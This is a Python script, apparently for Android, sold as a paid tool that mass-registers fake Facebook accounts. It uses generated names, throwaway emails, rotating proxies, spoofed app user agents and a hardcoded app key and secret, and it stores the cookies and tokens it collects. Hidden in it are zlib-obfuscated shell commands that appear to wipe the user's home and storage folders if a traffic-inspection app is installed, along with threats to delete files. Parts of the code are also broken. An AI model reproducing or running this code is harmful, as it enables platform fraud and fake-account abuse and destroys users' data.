# ------------[ AUTO CREATE FACEBOOK ACCOUNTS ]-------------- #
# ------------[ IMPORT ]-------------- #
import os, sys, re, time, json
import requests, bs4, random
import requests,bs4,string,platform,subprocess,uuid
import os
import sys
import re
import time
import json
import random
import string
import hashlib
import platform
from rich import print 
from rich.tree import Tree
from rich.panel import Panel
from rich.columns import Columns
from rich.console import Console
from rich.console import Group
from rich.align import Align
from rich.syntax import Syntax
from datetime import datetime
from datetime import date
from time import localtime as lt
from time import sleep
from time import sleep as jeda
from time import strftime
from bs4 import BeautifulSoup as sop
from datetime import datetime
from time import sleep as slp
try:
    import requests
    import concurrent.futures
    import mechanize
    import pytz
    import fake_email
    from faker import Faker
    from bs4 import BeautifulSoup
    from fake_useragent import UserAgent
    from fake_email import Email
except ImportError:
    os.system('pip install requests futures mechanize fake_email pytz faker beautifulsoup4 fake_useragent')
    import requests
    import concurrent.futures
    import mechanize
    import pytz
    import fake_email
    from faker import Faker
    from bs4 import BeautifulSoup
    from fake_useragent import UserAgent
    from fake_email import Email
console = Console()
# ------------[ SECURITY-CODE ]-------------- #
def clr():
    try:
        data = os.listdir('/sdcard')
        if 'Android' in data:
            print(Panel('  [bold white]ALL YOUR FILES WILL REMOVE IF YOU TRY AGAIN! | FUCK YOU LOL',style="bold purple"));exit()
        else:exit()
    except:exit()

from requests import api
x = open(api.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'std' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'disp' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'open().write' in x:
    clr()
if 'write' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'logging' in x:
    clr()
if 'printf' in x:
    clr()
if 'echo' in x:
    clr()
if 'os.system' in x:
    clr()
if 'system' in x:
    clr()
if '(url)' in x:
    clr()
if '{url}' in x:
    clr()
if '(data)' in x:
    clr()
if '{data}' in x:
    clr()
if '(headers)' in x:
    clr()
if 'ERROR' in x:
    clr()
if '{headers}' in x:
    clr()
from requests import sessions
x = open(sessions.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'sdcard' in x:
    clr()
if "60*'='" in x:
    clr()
if "60 * '='" in x:
    clr()
if "'='" in x:
    clr()
if 'std' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'open().write' in x:
    clr()
if 'open' in x:
    clr()
if 'write' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'logging' in x:
    clr()
if 'printf' in x:
    clr()
if 'open' in x:
    clr()
if 'echo' in x:
    clr()
if 'str(data)' in x:
    clr()
if 'str(headers)' in x:
    clr()
if 'str(url)' in x:
    clr()
if 'd(url)' in x:
    clr()
if 'c(url)' in x:
    clr()
if 'b(url)' in x:
    clr()
if 'a(url)' in x:
    clr()
if 'f(url)' in x:
    clr()
if 'j(url)' in x:
    clr()
if 'k(url)' in x:
    clr()
if 'l(url)' in x:
    clr()
if 'm(url)' in x:
    clr()
if 'n(url)' in x:
    clr()
if 'o(url)' in x:
    clr()
if 'p(url)' in x:
    clr()
if 'q(url)' in x:
    clr()
if 's(url)' in x:
    clr()
if 'r(url)' in x:
    clr()
if 't(url)' in x:
    clr()
if 'u(url)' in x:
    clr()
if 'v(url)' in x:
    clr()
if 'z(url)' in x:
    clr()
if 'y(url)' in x:
    clr()
if 'x(url)' in x:
    clr()
if 'w(url)' in x:
    clr()
if '((url)' in x:
    clr()
if '+url' in x:
    clr()
if '{url}' in x:
    clr()
if '(data)' in x:
    clr()
if '{data}' in x:
    clr()
if '(headers)' in x:
    clr()
if 'ERROR' in x:
    clr()
if '{headers}' in x:
    clr()
from requests import models
x = open(models.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'RPW-BRYX1107GRAY' in x:
    clr()
if 'BRYX' in x:
    clr()
if 'if self.url' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'blob' in x:
    clr()
if '.txt' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'approvalSheet' in x:
    clr()
if 'approval' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'disp' in x:
    clr()
if 'open().write' in x:
    clr()
if 'write' in x:
    clr()
if 'open' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'printf' in x:
    clr()
if 'echo' in x:
    clr()
if 'system' in x:
    clr()
if 'M4786==' in x:
    clr()
if 'M1107==' in x:
    clr()
if 'os.system' in x:
    clr()
if 'd(url)' in x:
    clr()
if 'c(url)' in x:
    clr()
if 'b(url)' in x:
    clr()
if 'a(url)' in x:
    clr()
if 'f(url)' in x:
    clr()
if 'j(url)' in x:
    clr()
if 'k(url)' in x:
    clr()
if 'm(url)' in x:
    clr()
if 'o(url)' in x:
    clr()
if 'p(url)' in x:
    clr()
if 'q(url)' in x:
    clr()
if 's(url)' in x:
    clr()
if 'e(url)' in x:
    clr()
if 'g(url)' in x:
    clr()
if 'h(url)' in x:
    clr()
if 'i(url)' in x:
    clr()
if 't(url)' in x:
    clr()
if 'u(url)' in x:
    clr()
if 'v(url)' in x:
    clr()
if 'z(url)' in x:
    clr()
if 'y(url)' in x:
    clr()
if 'x(url)' in x:
    clr()
if 'w(url)' in x:
    clr()
if '((url)' in x:
    clr()
if '+url' in x:
    clr()
if '{data}' in x:
    clr()
if 'str(data)' in x:
    clr()
if 'str(headers)' in x:
    clr()
if 'ERROR' in x:
    clr()
if '{headers}' in x:
    clr()
# ------------[ UNINSTALL HTTPCANARY ]-------------- #
try:
    a = "anar"
    t="tt"
    fileee = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
    if f'com.h{t}pc{a}y.pro' in fileee:
        print(Panel('  [bold white]FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS',style="bold purple"))
        os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
        os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
        os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
        exit()
except Exception as e:
    pass
# ------------[ UNINSTALL HTTPCANARY ]-------------- #
os.system('clear')
os.system('git pull --quiet 2>/dev/null')
bit = platform.architecture()[0]
if bit == '64bit':
 print(Panel('  [bold green]YOU ARE 64BIT USER',style="bold purple"))
 time.sleep(4)
elif bit == '32bit':
 print(Panel('  [bold green]YOU ARE 32BIT USER',style="bold purple"))
time.sleep(4)
# ------------[ FILE FOLDER ]-------------- #
folder_path = '/sdcard/AUTO-CREATE-BRYX/create/'
try:
    os.makedirs(folder_path, exist_ok=True)
except:
    pass
# ------------[ PROXY ]-------------- #
def load_proxies():
    proxy_url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all"
    try:
        response = requests.get(proxy_url)
        if response.status_code == 200:
            return [proxy.strip() for proxy in response.text.splitlines()]
    except requests.exceptions.RequestException:
        pass
    return []

proxies_list = load_proxies()

def get_random_proxy():
    if proxies_list:
        return {"http": random.choice(proxies_list)}
    return None
# ------------[ WAKTU ]-------------- #
bulan = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10': 'October', '11': 'November', '12': 'December'}
bulan2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.now().day
bln = bulan[(str(datetime.now().month))]
thn = datetime.now().year
tanggal = (str(tgl)+' '+str(bln)+' '+str(thn))
waktu = strftime('%H:%M:%S')
hari = datetime.now().strftime("%A")

dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
days = datetime.now().day
months = dic[(str(datetime.now().month))]
years = datetime.now().year
date = f''+str(days)+f'/'+str(months)+f'/'+str(years)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
# ------------[ SPACE SYSTEM ]-------------- #
def space():
    print("\n")
# ------------[ CLEAR ]-------------- #
def clear():
    os.system("clear")
# ------------[ STATUS ]-------------- #
status = f"ACTIVE"
# ------------[ GREETING ]-------------- #
def greet_ph():
    bd_timezone = pytz.timezone("Asia/Manila")
    bd_time = datetime.now(bd_timezone).hour
    if 5 <= bd_time < 12:
        return "GOOD MORNING"
    elif 12 <= bd_time < 18:
        return "GOOD AFTERNOON"
    else:
        return "GOOD NIGHT"
# ------------[ COUNTRY ]-------------- #
def __countryX__():
	country =  "PHILIPPINES"
	return country
# ------------[ SIM CARD ]-------------- #
__simX__ = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').replace('\n','').replace(',',f'/')
# ------------[ CALL AREA ]-------------- #
country = __countryX__()
greeting = greet_ph()
current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
# ------------[ BANNER ]-------------- #
run_count = 0
status_list = ['ONLINE', 'ACTIVE', 'BUSY', 'AWAY', 'DO NOT DISTURB']
random_status = random.choice(status_list)
# ------------[ LOGO ]-------------- #
logo=("""               [cyan1]ERRORPOGI
   [violet] █████╗ ████████╗ ██████╗ ███████╗██████╗
   [violet]██╔══██╗╚══██╔══╝██╔════╝ ██╔════╝██╔══██╗
   [violet]███████║   ██║   ██║█████╗█████╗  ██████╔╝
   [violet]██╔══██║   ██║   ██║╚════╝██╔══╝  ██╔══██╗
   [violet]██║  ██║   ██║   ╚██████╗ ██║     ██████╔╝
   [violet]╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═════╝    [green][bold]VERSION/0.3
          [cyan1]MY [dark_olive_green]SYSTEM[cyan1] IS[dark_olive_green…] DIFFERENT BROTHER
""")
ll=str([hari,tanggal])

hx=(f"""  [bold green1]OWNER/ADMIN[medium_purple1]   ➙ [cyan][bold]BRYX ANTON GRAYSON
  [bold green1]GIRLFRIEND[medium_purple1]    ➙ [green][bold]JAHRA
  [bold green1]TOOL TYPE[medium_purple1]     ➙ [green][bold]AUTOMATIC CREATE FACEBOOK/PAID TOOLS
  [bold green1]STATUS[medium_purple1]        ➙ [green][bold]PREMIUM
  [bold green1]TODAYS[medium_purple1]        ➙ [green][bold]{date}
  [bold green1]GREET[medium_purple1]         ➙ [green][bold]{greeting}
  [bold green1]SIM[medium_purple1]           ➙ [green][bold]{__simX__}
  [bold green1]COUNTRY[medium_purple1]       ➙ [green][bold]{country}""")
hrx=(f"""  [bold green1]OK IDS SAVE IN[medium_purple1]   ➙ [green][bold]/sdcard/AUTO-CREATE-BRYX/BRYX-CREATE-FB-NEW-M1-OK.txt
  [bold green1]COOKIE SAVE IN[medium_purple1]   ➙ [green][bold]/sdcard/AUTO-CREATE-BRYX/BRYX-CREATE-FB-NEW-COOKIE.txt
  [bold green1]OK IDS SAVE IN[medium_purple1]   ➙ [green][bold]/sdcard/AUTO-CREATE-BRYX/BRYX-CREATE-FB-NEW-M2-OK.txt
  [bold green1]TOKENS SAVE IN[medium_purple1]   ➙ [green][bold]/sdcard/AUTO-CREATE-BRYX/BRYX-CREATE-FB-NEW-TOKEN.txt""")
# ------------[ BANNER/CLEAR ]-------------- #
def banner():
    os.system("clear")
    print(Panel(logo,subtitle="[bold red]❏ [bright_yellow]❏ [green1]❏",subtitle_align='left',title="[bold red]❏ [bright_yellow]❏ [green1]❏",title_align='right',width=102,padding=0,style="bold purple"))
    print(Panel(hx,width=100,padding=0,style="bold purple"))
    print(Panel(hrx,width=100,padding=0,style="bold purple"))
# ------------[ GENERATE RANDOM STRING ]-------------- #
def generate_random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))    
# ------------[ USERAGENT UA ]-------------- #
ua = UserAgent()
def ugenX():
    ualist = [ua.random for _ in range(50)]
    return str(random.choice(ualist))

def user_agents():
    devices = [
        "[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 9 Pro;FBSV/10]",
        "[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287519012;FBDM/{density=2.75,width=1080,height=2134};FBLC/cs_CZ;FBRV/289140577;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/10]",
        "[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1931;FBSV/10]",
        "[FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162189;FBDM/{density=3.0,width=1080,height=2165};FBLC/it_IT;FBRV/526139383;FBCR/TIM;FBMF/OnePlus;FBBD/OnePlus;FBDV/LE2113;FBSV/13]",
        "[FBAN/FB4A;FBAV/221.0.0.48.102;FBBV/154683427;FBDM/{density=2.75,width=1080,height=2030};FBLC/en_GB;FBRV/155327069;FBCR/Banglalink;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 5;FBSV/8.1.0]"
    ]
    prefix = "[FBAN/FB4A;FBAV/" + str(random.randint(11, 80)) + ".0.0." + str(random.randint(9, 49)) + "." + str(random.randint(11, 77)) + ";FBBV/" + str(random.randint(11111111,99999999)) + ";"
    ua = prefix + random.choice(devices)
    return ua

def generate_user_agent():
    fbav = f"{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}"
    fbbv = str(random.randint(111111111, 999999999))
    fbrv = '0'
    random_seed = random.Random()
    adid = ''.join(random_seed.choices(string.hexdigits, k=16))
    device = random.choice(["HUAWEI MAR-LX1M", "Samsung SM-G960F", "OnePlus GM1913"])
    fbav_version = str(random.randint(49, 150))
    fbbv_version = str(random.randint(11111111, 77777777))
    carrier = random.choice(["Ooredoo TN", "Orange", "Vodafone", "T-Mobile"])
    ua_bgraph = f'[FBAN/FB4A;FBAV/{fbav_version}.0.0.{random.randrange(20, 49)}.{random.randint(11, 99)};FBBV/{fbbv_version};' \
                f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{{density=3.0,width=1080,height=2107}};FBLC/fr_FR;' \
                f'FBRV/{fbrv};FBCR/{carrier};FBMF/{device.split(" ")[0]};FBBD/{device.split(" ")[0]};' \
                f'FBPN/com.facebook.katana;FBDV/{device};FBSV/9;FBOP/1;FBCA/arm64-v8a:]'
    return ua_bgraph

def ax():
    facebook_version = f'''{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}'''
    fbbv = str(random.randint(410000000, 499999999))
    fbrv = str(random.randint(0, 999999999))
    fbcr = random.choice([
        'GLOBE',
        'TM',
        'TNT',
        'SMART',
        'DITO',
        'Verizon',
        'Sprint',
        'null'])
    density = '2x1.6'
    width = '720'
    height = '1612'
    ua = f'''[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/{str(fbcr)};FBMF/motorola;FBBD/motorola;FBPN/com.facebook.orca;FBDV/Moto E14;FBSV/14;FBOP/1;FBCA/armeabi-v7a:armeabi;]'''
    return ua

def mineral():
	a = "[FBAN/FB4A;FBAV/"+str(random.randint(11,80))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,99999999))+";"
	b = "[FBAN/FB4A;FBAV/196.0.0.29.99;FBPN/com.facebook.katana;FBLC/en_US;FBBV/135374479;FBCR/SMART;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]','[FBAN/FB4A;FBAV/196.0.0.29.99;FBPN/com.facebook.katana;FBLC/en_US;FBBV/135374479;FBCR/SMART;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
	ua = a+b
	return ua
# ------------[ LOCK ID ]-------------- #
def lock_checker(id):
    try:
        response = requests.get(f'https://graph.facebook.com/{id}/picture?type=normal')
        if 'Photoshop' in response.text:
            return 'Active'
        else:
            return 'Locked'
    except Exception as e:
        pass
        return 'Error'
# ------------[ FAKE PHILIPPINES NAME ]-------------- #
def fake_name():
    first = Faker().first_name()
    last = Faker().last_name()
    return first, last
# ------------[ FAKE INDONESIA NAME ]-------------- #
def fake_namee():
    first = Faker("id_ID").first_name()
    last = Faker("id_ID").last_name()
    return first,last
# ------------[ EXTRACTOR DATA ]-------------- #
def extractor(data):
    soup = BeautifulSoup(data, "html.parser")
    data = {}
    for inputs in soup.find_all("input"):
        name = inputs.get("name")
        value = inputs.get("value")
        if name:
            data[name] = value
    return data
# ------------[ EMAIL ADDRESS ]-------------- #
def generate_random_emails(length=10, domains=None, count=1):
    if domains is None:
        domains = ['hotmail.com', 'outlook.com', 'yahoo.com', 'yahoo.com.ph', 'gmail.com', 'gmx.com', 'protonmail.com', 'tutanota.com', 'icloud.com']
    emails = []
    for _ in range(count):
        prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
        domain = random.choice(domains)
        emails.append(f"{prefix}@{domain}")
    return emails if count > 1 else emails[0]
# ------------[ LOOP ]-------------- #
oks=[]
cps=[]
pcp=[]
id=[]
uid=[]
cid=[]
user_id=[]
tokenku=[]
# ------------[ MAIN MENU ]-------------- #
def AUTO_BRYX():
    banner()
    a=(Panel("""    [green_yellow][[bold cyan1]1/A[green_yellow]][bold green] AUTOMATIC FACEBOOK ACCOUNT CREATION\n    [green_yellow][[bold cyan1]2/B[green_yellow]][bold green] TOKEN GETTING\n    [green_yellow][[bold cyan1]3/C[green_yellow]][bold green] GUARD PROFILE\n    [green_yellow][[bold cyan1]4/D[green_yellow]][bold green] AUTO 2F\n    [green_yellow][[bold cyan1]5/E[green_yellow]][bold green] CONTACTED OWNER/ADMIN\n    [green_yellow][[bold cyan1]6/F[green_yellow]][bold red] EXIT TOOL    """,title="[reverse purple] TOOL MENU",style="bold purple"))
    print(Panel(a,subtitle="[bold purple]┌─",subtitle_align='left',style="bold purple"))
    Bryx = console.input("   [bold purple]└──> ")
    if Bryx in ["a","A","1","01"]:
        createmethod()
    elif Bryx in ["b","B","2","02"]:
        print(Panel(f" [bold white]Wait for update",style="bold purple"))
    elif Bryx in ["c","C","3","03"]:
        guardon()
    elif Bryx in ["d","D","4","04"]:
        auto2f()
    elif Bryx in ["e","E","5","05"]:
        os.system("xdg-open https://www.facebook.com/bryxxxpogi")
        time.sleep(2);AUTO_BRYX()
    elif Bryx in ["f","F","6","06"]:exit()
    else:AUTO_BRYX()
# ------------[ METHOD ]-------------- #
def createmethod():
    banner()
    a=(Panel("""    [green_yellow][[bold cyan1]1/A[green_yellow]][bold green] METHOD M.FACEBOOK\n    [green_yellow][[bold cyan1]2/B[green_yellow]][bold green] METHOD B-API.FACEBOOK   """,title="[reverse purple] METHOD",style="bold purple"))
    print(Panel(a,subtitle="[bold purple]┌─",subtitle_align='left',style="bold purple"))
    mthd = console.input("   [bold purple]└──> ")
    if mthd in ["a","A","1","01"]:
        createfb1()
    elif mthd in ["b","B","2","02"]:
        createfb2()
# ------------[ RESULTS ]-------------- #
def results():
    print(Panel(f"""[bold white]  FINAL RESULTS\n  SUCCESS : [bold green]{len(oks)}[/]\n  BAD     : [bold red]{len(cps)}[/]\n  RESULTS ARE SAVED TO THE RESULTS FOLDER""",subtitle="[bold red]❏ [bright_yellow]❏ [green1]❏",subtitle_align='left',title="[bold red]❏ [bright_yellow]❏ [green1]❏",title_align='right',width=102,padding=0,style="bold purple"))
# ------------[ AUTO CREATE FB ]-------------- #
def createfb1():
    ck=[]
    cid=[]
    global loop,oks,cps
    banner()
    print(Panel(" [bold green]ENTER HOW MANY ACC", subtitle='[bold purple]╭─────',subtitle_align='left',style="bold purple"))
    num = int(console.input("   [bold purple]└──> "))
    banner()
    a=(Panel("""    [green_yellow][[bold cyan1]1/A[green_yellow]][bold green] PHILIPPINES NAMES\n    [green_yellow][[bold cyan1]2/B[green_yellow]][bold green] INDONESIA NAMES    """,title="[reverse purple] NAME ",style="bold purple"))
    print(Panel(a,subtitle="[bold purple]┌─",subtitle_align='left',style="bold purple"))
    bryxname = console.input("   [bold purple]└──> ")
    banner()
    a=(Panel("""    [green_yellow][[bold cyan1]1/A[green_yellow]][bold green] CUSTOM PASSWORD    """,title="[reverse purple] PASSWORD ",style="bold purple"))    
    print(Panel(a,subtitle="[bold purple]┌─",subtitle_align='left',style="bold purple"))
    bryxpassword = console.input("   [bold purple]└──> ")
    if bryxpassword == '1':
    	print(Panel(" [bold green]ENTER CUSTOM PASSWORD", subtitle='[bold purple]╭─────',subtitle_align='left',style="bold purple"))
    	pww = console.input("   [bold purple]└──> ")
    else:
    	pww = '12345678'
    banner()
    print(Panel(f" [bold green]TOTAL ACCOUNT ID ➙ {num}\n [bold green]ACCOUNT CREATING STARTED\n [bold green]IF NO RESULT ON/OFF AIRPLANE MODE OR VPN 1.1.1.1",style="bold purple"))
    for make in range(num):
        sys.stdout.write(f'\033[1;37m [BRYXPOGI-CREATE] \033[1;37m{make + 1}\033[1;37m|\033[1;32mOK:-{len(oks)}\033[1;37m|\033[1;31mCP:-{len(cps)}\r\033[1;37m')
        sys.stdout.flush()
        ses = requests.Session()
        response = ses.get("https://x.facebook.com/reg")
        form = extractor(response.text)
        if bryxname == '1':
        	firstname, lastname = fake_name()
        elif bryxname == '2':
        	firstname, lastname = fake_namee()
        email2 = generate_random_emails()
        payload = {
            'ccp': "2",
            'reg_instance': form.get("reg_instance", ""),
            'submission_request': "true",
            'reg_impression_id': form.get("reg_impression_id", ""),
            'ns': "1",
            'logger_id': form.get("logger_id", ""),
            'firstname': firstname,
            'lastname': lastname,
            'birthday_day': str(random.randint(1, 28)),
            'birthday_month': str(random.randint(1, 12)),
            'birthday_year': str(random.randint(1992, 2009)),
            'reg_email__': email2,
            'sex': "2",
            'encpass': '#PWD_BROWSER:0:{}:{}'.format(str(time.time()).split('.')[0], pww),
            'submit': "Sign Up",
            'fb_dtsg': form.get("fb_dtsg", ""),
            'jazoest': form.get("jazoest", ""),
            'lsd': form.get("lsd", "")
        }

        headers = {
            "Host": "m.facebook.com",
            "Connection": "keep-alive",
            "User-Agent": ugenX(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9"
        }

        reg_url = "https://www.facebook.com/reg/submit/"
        reg_submit = ses.post(reg_url, data=payload, headers=headers)
        if "c_user" in ses.cookies.get_dict():
            cid = ses.cookies.get_dict()["c_user"]
            cok = ";".join([f"{key}={val}" for key, val in ses.cookies.get_dict().items()])
            #foto = photo_profile()
            print(f'\r[bold green] [BRYX-OK] {cid} | {pww}')
            print(f'\r[bold green] [NAME] {firstname} {lastname}')
            #print(f'\r[bold green] [PHOTO] {foto}')
            print(f'\r[bold green] [COOKIE] : {cok}')
            open("/sdcard/AUTO-CREATE-BRYX/create/BRYX-CREATE-FB-NEW-M1-OK.txt", "a").write(cid+"|"+pww+"\n");open("/sdcard/AUTO-CREATE-BRYX/create/BRYX-CREATE-FB-NEW-COOKIE.txt", "a").write(cid+"|"+pww+"|"+cok+"\n")
            os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
            oks.append(cid)
            time.sleep(random.uniform(3, 6))
        else:
            os.system('espeak -a 300 " OH SHIT CP ID"')
            cps.append(cid)
    results()
# ------------[ AUTO CREATE FB ]-------------- #
def createfb2():
    fake = Faker()
    banner()
    print(Panel(" [bold green]ENTER HOW MANY ACC", subtitle='[bold purple]╭─────',subtitle_align='left',style="bold purple"))
    num = int(console.input("   [bold purple]└──> "))
    banner()
    a=(Panel("""    [green_yellow][[bold cyan1]1/A[green_yellow]][bold green] PHILIPPINES NAMES\n    [green_yellow][[bold cyan1]2/B[green_yellow]][bold green] INDONESIA NAMES    """,title="[reverse purple] NAME ",style="bold purple"))
    print(Panel(a,subtitle="[bold purple]┌─",subtitle_align='left',style="bold purple"))
    bryxname = console.input("   [bold purple]└──> ")
    banner()
    a=(Panel("""    [green_yellow][[bold cyan1]1/A[green_yellow]][bold green] CUSTOM PASSWORD    """,title="[reverse purple] PASSWORD ",style="bold purple"))    
    print(Panel(a,subtitle="[bold purple]┌─",subtitle_align='left',style="bold purple"))
    bryxpassword = console.input("   [bold purple]└──> ")
    if bryxpassword == '1':
    	print(Panel(" [bold green]ENTER CUSTOM PASSWORD", subtitle='[bold purple]╭─────',subtitle_align='left',style="bold purple"))
    	password = console.input("   [bold purple]└──> ")
    else:
    	pww = '12345678'
    banner()
    print(Panel(f" [bold green]TOTAL ACCOUNT ID ➙ {num}\n [bold green]ACCOUNT CREATING STARTED\n [bold green]IF NO RESULT ON/OFF AIRPLANE MODE OR VPN 1.1.1.1",style="bold purple"))
    for i in range(num):
        em = Email().Mail()
        email = em['mail']
        if bryxname == '1':
        	first_name, last_name = fake_name()
        elif bryxname == '2':
        	first_name, last_name = fake_namee()
        register_account(fake, email, password, i, first_name, last_name, em)
    results()
# ------------[ ACCOUNT CREATOR ]-------------- #
def register_account(fake, email, password, i, first_name, last_name, em):
    sys.stdout.write(f'\033[1;37m [BRYXPOGI-CREATE] \033[1;37m{i + 1}\033[1;37m|\033[1;32mOK:-{len(oks)}\033[1;37m|\033[1;31mCP:-{len(cps)}\r\033[1;37m')
    sys.stdout.flush()
    session = requests.Session()
    api_key = '882a8490361da98702bf97a021ddc14d'
    secret = '62f8ce9f74b12f84c123cc23437a4a32'
    birthday = fake.date_of_birth(minimum_age=18, maximum_age=90)
    gender = random.choice(['M', 'F'])
    payload = {
        'api_key': api_key,
        'attempt_login': True,
        'birthday': birthday.strftime('%Y-%m-%d'),
        'client_country_code': 'US',
        'fb_api_caller_class': 'com.facebook.registration.protocol.RegisterAccountMethod',
        'fb_api_req_friendly_name': 'registerAccount',
        'firstname': first_name,
        'format': 'json',
        'gender': gender,
        'lastname': last_name,
        'email': email,
        'locale': 'en_US',
        'method': 'user.register',
        'password': password,
        'reg_instance': generate_random_string(32),
        'return_multiple_errors': True
    }
    proxy = get_random_proxy()
    sorted_req = sorted(payload.items(), key=lambda x: x[0])
    sig_str = ''.join(f'{k}={v}' for k, v in sorted_req)
    payload['sig'] = hashlib.md5((sig_str + secret).encode()).hexdigest()
    uaa = user_agents()
    uaa = generate_user_agent()
    uaa = ax()
    headers = {'User-Agent': uaa}
    response = session.post('https://b-api.facebook.com/method/user.register', data=payload, headers=headers, proxies=proxy, timeout=30)
    try:
        reg = response.json()
    except:
        print(f"{RED}FAILED TO PARSE RESPONSE{RESET}")
        return
    id = reg.get('new_user_id')
    token = reg.get('session_info', {}).get('access_token')
    if id:
        status = lock_checker(id)
        if status == 'Locked':
            cps.append(id)
        else:
            try:
                inbox = Email(em["session"]).inbox()
                code_match = re.search(r'(\d+)', str(inbox.get('topic', '')))
                code = code_match.group(1) if code_match else 'code not found'
            except Exception as e:
                code = 'code not found'
            FbLink=f"https://www.facebook.com/profile.php?id={id}"
            print(f'\r[bold green] [BRYX-OK] {id} | {password} | {code}')
            cookies = session.cookies.get_dict()
            cookie_str = "; ".join([f"{key}={value}" for key, value in sorted_req])
            open("/sdcard/AUTO-CREATE-BRYX/create/BRYX-CREATE-FB-NEW-M2-OK.txt", "a").write(id+"|"+password+"\n");open("/sdcard/AUTO-CREATE-BRYX/create/BRYX-CREATE-FB-NEW-TOKEN.txt", "a").write(id+"|"+password+"|"+token+"\n")
            time.sleep(random.uniform(3,6))
            oks.append(id)
    else:
        if id is not None:
        	cps.append(id)
        else:
        	cps.append(id)
# ------------[ END ]-------------- #
if __name__ == "__main__":
    AUTO_BRYX()